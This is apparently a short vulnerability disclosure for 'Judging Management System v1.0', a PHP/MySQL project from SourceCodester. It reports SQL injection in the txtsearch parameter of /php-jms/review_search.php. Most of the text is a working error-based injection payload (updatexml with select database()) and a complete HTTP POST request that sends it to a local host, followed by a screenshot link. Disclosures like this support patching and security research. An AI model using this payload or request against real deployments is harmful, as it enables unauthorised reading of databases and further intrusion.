# Judging Management System v1.0 by oretnom23 has SQL injection

BUG_Author: Pings

vendors: https://www.sourcecodester.com/php/15910/judging-management-system-using-php-and-mysql-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /php-jms/review_search.php

Vulnerability location: /php-jms/review_search.php, txtsearch

dbname =jms_db

[+] Payload: txtsearch=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+'%--+ // Leak place ---> txtsearch

```sql
POST /php-jms/review_search.php HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=f6bhcgo222sk31fnm99nf9tjt1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

txtsearch=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+'%--+
```

![image](https://user-images.githubusercontent.com/54017627/206376585-4d008bc2-c22d-4074-82f7-e1ce38a4a169.png)
